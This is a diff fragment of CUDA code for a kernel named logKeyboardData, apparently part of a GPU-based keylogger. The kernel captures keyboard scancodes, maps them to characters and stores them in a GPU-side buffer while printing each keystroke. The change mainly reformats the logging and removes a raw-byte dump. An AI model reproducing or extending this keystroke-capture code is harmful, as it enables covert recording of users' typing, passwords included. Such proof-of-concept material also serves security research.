@@ -25,25 +25,20 @@ __global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap,
 	int index = blockIdx.x*blockDim.x + threadIdx.x;
 	if (index == 0) {
 		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0
-			if (*keystrokeIndex < 9998) {
-				cudaBuffer[*keystrokeIndex++] = KeyMap[keyboardData->MakeCode];
-			}
-
-			printf("GPU: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]",
-				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
-				keyboardData->MakeCode,
-				KeyMap[keyboardData->MakeCode],
-				keyboardData->UnitId,
-				keyboardData->Flags,
-				keyboardData->Reserved,
-				keyboardData->ExtraInformation);
-			printf(" raw:");
-			PCHAR p = (PCHAR)keyboardData;
-			for (int i = 0; i < 12; i++) {
-				printf("[0x%x]", p[i]);
-
-			}
-			printf("\n");
+			
+//			if (keyboardData->MakeCode) {
+				if (*keystrokeIndex < 9998) {
+					cudaBuffer[*keystrokeIndex++] = KeyMap[keyboardData->MakeCode];
+				}
+				printf("GPU: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]\n",
+					keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
+					keyboardData->MakeCode,
+					KeyMap[keyboardData->MakeCode],
+					keyboardData->UnitId,
+					keyboardData->Flags,
+					keyboardData->Reserved,
+					keyboardData->ExtraInformation);
+//			}
 
 			*lastMake = keyboardData->MakeCode;
 			*lastModifier = keyboardData->Flags;
